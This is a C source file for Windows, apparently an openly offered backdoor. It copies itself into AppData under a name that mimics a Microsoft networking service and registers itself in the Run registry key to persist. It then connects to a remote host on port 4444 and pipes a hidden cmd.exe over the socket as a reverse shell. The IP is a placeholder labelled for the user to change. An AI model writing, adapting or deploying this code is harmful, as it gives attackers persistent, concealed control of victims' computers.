#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h> // For SHGetFolderPath

#pragma comment(lib, "ws2_32.lib")

// Function to get destination path in AppData
BOOL GetDestinationPath(char* path, size_t size) {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath) != S_OK) {
        return FALSE;
    }
    snprintf(path, size, "%s\\Microsoft Networking Services\\MicrosoftNetworkingServices.exe", appDataPath);
    return TRUE;
}

BOOL CopySelf(const char* destPath) {
    char currentPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, currentPath, MAX_PATH))
        return FALSE;
    // Ensure destination directory exists
    char dirPath[MAX_PATH];
    strcpy(dirPath, destPath);
    char* lastSlash = strrchr(dirPath, '\\');
    if (lastSlash) {
        *lastSlash = '\0';
        CreateDirectoryA(dirPath, NULL);
    }
    return CopyFileA(currentPath, destPath, FALSE);
}

BOOL AddToStartup(const char* exePath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS)
        return FALSE;

    BOOL success = (RegSetValueExA(
        hKey,
        "MicrosoftNetworkingServices",
        0,
        REG_SZ,
        (const BYTE*)exePath,
        (DWORD)(strlen(exePath) + 1)
    ) == ERROR_SUCCESS);

    RegCloseKey(hKey);
    return success;
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    char destPath[MAX_PATH];
    if (!GetDestinationPath(destPath, sizeof(destPath))) {
        WSACleanup();
        return 1;
    }

    if (!CopySelf(destPath)) {
        DWORD lastError = GetLastError();
        if (lastError != ERROR_FILE_EXISTS) {
        }
    }

    AddToStartup(destPath);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444); // Change port if needed
    server_addr.sin_addr.s_addr = inet_addr("676767676767"); // Change IP if needed

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;

    if (!CreatePipe(&hStdInRead, &hStdInWrite, &saAttr, 0)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
        CloseHandle(hStdInRead);
        CloseHandle(hStdInWrite);
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide window
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    char cmdLine[MAX_PATH] = "cmd.exe";

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi)
        ) {
        CloseHandle(hStdInRead);
        CloseHandle(hStdInWrite);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        closesocket(sock);
        WSACleanup();
        return 1;
    }


    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);


    char buffer[1024];
    DWORD dwRead, dwWritten;

    while (1) {
        int received = recv(sock, buffer, sizeof(buffer), 0);
        if (received <= 0)
            break;
        WriteFile(hStdInWrite, buffer, received, &dwWritten, NULL);

        BOOL success = ReadFile(hStdOutRead, buffer, sizeof(buffer), &dwRead, NULL);
        if (success && dwRead > 0) {
            send(sock, buffer, dwRead, 0);
        }
    }

    // Cleanup
    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
